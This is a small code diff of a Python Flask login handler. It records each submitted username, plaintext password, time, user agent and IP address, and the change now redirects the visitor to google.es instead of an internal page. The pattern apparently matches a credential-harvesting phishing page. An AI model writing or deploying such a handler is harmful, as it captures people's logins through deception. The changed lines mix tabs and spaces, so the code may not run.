@@ -61,7 +61,7 @@ def login():
         print (UA)
         insert_readings(user, passwd, time, UA, remote_IP)
 	print(remote_IP)
-        return redirect("/users")
+	return redirect("https://www.google.es", code=302)
 
     return render_template('index2.html')
 
